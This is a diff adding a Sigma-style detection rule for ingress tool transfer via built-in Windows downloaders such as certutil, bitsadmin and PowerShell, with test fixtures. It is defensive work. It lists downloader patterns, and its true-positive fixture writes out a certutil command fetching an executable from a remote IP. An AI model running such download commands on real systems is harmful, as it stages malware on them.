@@ -1,0 +1,31 @@
+title: Ingress tool transfer with a built-in downloader
+id: lf-ingress-tool-transfer
+status: stable
+description: >
+  A file is downloaded with a living-off-the-land utility: certutil
+  -urlcache, bitsadmin /transfer, PowerShell DownloadString/DownloadFile,
+  Invoke-WebRequest -OutFile or Start-BitsTransfer.
+author: Logforge Security Team
+date: 2026/11/17
+references: [https://attack.mitre.org/techniques/T1105/]
+tags: [attack.command_and_control, attack.t1105]
+falsepositives:
+    - Administrative scripts that download installers with PowerShell
+logsource: {category: process_creation}
+detection:
+    selection_certutil:
+        command_line|contains|all: ['certutil', 'urlcache']
+    selection_bitsadmin:
+        command_line|contains|all: ['bitsadmin', '/transfer']
+    selection_powershell:
+        command_line|contains:
+            - 'DownloadString('
+            - 'DownloadFile('
+            - 'Start-BitsTransfer'
+    selection_iwr:
+        command_line|contains|all: ['Invoke-WebRequest', '-OutFile']
+    condition: 1 of selection_*
+fixtures:
+    true_positive: {process_name: 'C:\Windows\System32\certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.66/p.exe C:\Users\Public\p.exe'}
+    true_negative: {process_name: 'C:\Windows\System32\certutil.exe', command_line: 'certutil.exe -hashfile C:\Users\Public\setup.exe SHA256'}
+level: high
